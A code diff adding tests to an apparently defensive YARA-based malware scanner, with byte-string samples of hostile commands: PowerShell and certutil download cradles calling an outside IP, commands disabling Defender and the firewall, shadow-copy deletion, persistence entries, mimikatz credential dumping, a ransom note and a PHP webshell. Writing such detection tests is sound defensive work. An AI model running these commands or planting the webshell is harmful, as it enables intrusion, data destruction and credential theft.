@@ -77,6 +77,54 @@ def test_yara_matches_eicar_when_available():
     assert any(m["rule"] == "EICAR_Test_File" for m in matches)
 
 
+def test_yara_detects_multiple_techniques_in_dropper():
+    if not yara_available():
+        return
+    dropper = (
+        b"powershell -nop -w hidden -ep bypass -enc AAAA\n"
+        b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1')\n"
+        b"(New-Object Net.WebClient).DownloadFile('http://45.147.230.112/b','x')\n"
+        b"certutil -urlcache -split -f http://45.147.230.112/c c\n"
+        b"bitsadmin /transfer j http://45.147.230.112/d d\n"
+        b"Set-MpPreference -DisableRealtimeMonitoring $true\n"
+        b"netsh advfirewall set allprofiles state off\n"
+        b"AmsiScanBuffer amsiInitFailed AmsiUtils\n"
+        b"vssadmin delete shadows /all /quiet\nwmic shadowcopy delete\n"
+        b"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y /f\n"
+        b"schtasks /create /sc onlogon /tn t /tr y\n"
+        b"VirtualAllocEx WriteProcessMemory CreateRemoteThread NtUnmapViewOfSection\n"
+        b"sekurlsa::logonpasswords lsass.exe \\Login Data\n"
+    )
+    rules = {m["rule"] for m in scan_with_yara(dropper)}
+    for expected in {
+        "PowerShell_Download_Cradle",
+        "LOLBin_Ingress_Tool_Transfer",
+        "Defense_Evasion_Disable_Security_Tools",
+        "AMSI_Bypass_Indicators",
+        "ShadowCopy_Deletion",
+        "Credential_Access_Tooling",
+    }:
+        assert expected in rules, f"{expected} not matched ({rules})"
+
+
+def test_yara_detects_ransom_note_and_webshell():
+    if not yara_available():
+        return
+    ransom = (
+        b"All your files have been encrypted. To get the decryption key send "
+        b"bitcoin to our .onion site. Files renamed to .locked"
+    )
+    php = b"<?php eval(base64_decode($_REQUEST['c'])); system($_GET['cmd']); ?>"
+    assert any(m["rule"] == "Ransomware_Note_Or_Behavior" for m in scan_with_yara(ransom))
+    assert any(m["rule"] == "WebShell_Indicators" for m in scan_with_yara(php))
+
+
+def test_high_severity_yara_floors_the_score():
+    php = b"<?php eval(base64_decode($_REQUEST['c'])); ?>"
+    result = file_analysis_service.analyze_static_file("x.php", php)
+    assert result.risk.level == "high"  # confirmed webshell, even with no other signal
+
+
 # --- full pipeline + endpoint ---------------------------------------------
 
 def test_pipeline_flags_download_cradle():
